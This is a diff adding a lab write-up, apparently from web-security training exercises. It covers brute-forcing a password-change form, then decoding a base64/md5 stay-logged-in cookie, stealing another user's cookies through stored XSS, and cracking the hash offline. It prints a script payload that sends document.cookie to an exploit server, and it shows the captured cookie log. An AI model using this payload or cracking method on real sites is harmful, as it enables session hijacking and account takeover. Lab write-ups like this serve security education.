@@ -214,3 +214,31 @@ username=wiener&current-password=peter&new-password-1=123&new-password-2=123
 If you try and change the username from `wiener` to `carlos` . You get a new error `Current password is incorrect`  and there is no rate limit in place as well. All these combine to form the perfect opportunity for bruteforcing the password . Send to intruder , add current password as position , switch username to carlos , and filter using error.
 
 ![](images/pass_change_brute.png)
+
+## Lab: Offline password cracking
+
+We have our test account `wiener:peter` and the target as usual is `carlos`.
+
+When logging in there is the `stay-logged-in` option so that's interesting. Inspecting it in the request `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` . Its base64 encoded and it decodes to `wiener:51dc30ddc473d43a6011e9ebba6ca770` . Looking up `51dc30ddc473d43a6011e9ebba6ca770` in hash identifiers , we discover its an `md5` hash and it decodes to `peter` our password. Now that we know the hashing scheme , all that's left is getting `carlos` cookie.
+
+According to the challenge description , there is an `XSS` in the Post Comment functionality so that's what we test first using the good old `<script>alert(1)</script>` 
+
+![](images/alert.png)
+
+
+Confrims the XSS. Now to exfil the cookies to our server we use the following payload:
+
+`<script>fetch('https://exploit-server.net' + document.cookie)</script>`
+
+In our exploit server we get the log:
+`GET /secret=pvTsH8Ky2Q2mshYgbrm1Bp4qjGn6tMny;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`
+
+The secret is the session cookie and the stay-logged-in cookie is the stay logged in cookie.
+
+Now that we have the stay-logged-in cookie we can get his password as well:
+
+`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` -> `carlos:26323c16d5f4dabff3bb136f2460a943`
+
+`26323c16d5f4dabff3bb136f2460a943` ->md5 decrypt->`onceuponatime`
+
+![](images/offline_pass_crack.png)
